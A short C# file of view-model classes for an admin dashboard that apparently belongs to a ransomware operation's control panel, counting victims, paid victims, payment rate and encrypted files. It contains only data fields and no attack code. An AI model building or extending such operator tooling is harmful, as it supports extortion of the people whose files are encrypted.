public class AdminDashboardViewModel
{
    public int TotalVictims { get; set; }
    public int TotalPaidVictims { get; set; }
    public int NewVictimsLast24h { get; set; }
    public double PaymentRate { get; set; }
    public int TotalEncryptedFiles { get; set; }
    public Dictionary<DateTime, int> DailyNewVictims { get; set; }
    public IEnumerable<LogViewModel> RecentActivities { get; set; }

    public AdminDashboardViewModel()
    {
        DailyNewVictims = new Dictionary<DateTime, int>();
    }
}

public class LogViewModel
{
    public Guid user_id { get; set; }
    public string username { get; set; }
    public string action { get; set; }
    public DateTime created_at { get; set; }
}

public class DailyStatViewModel
{
    public DateTime Date { get; set; }
    public int Count { get; set; }
} 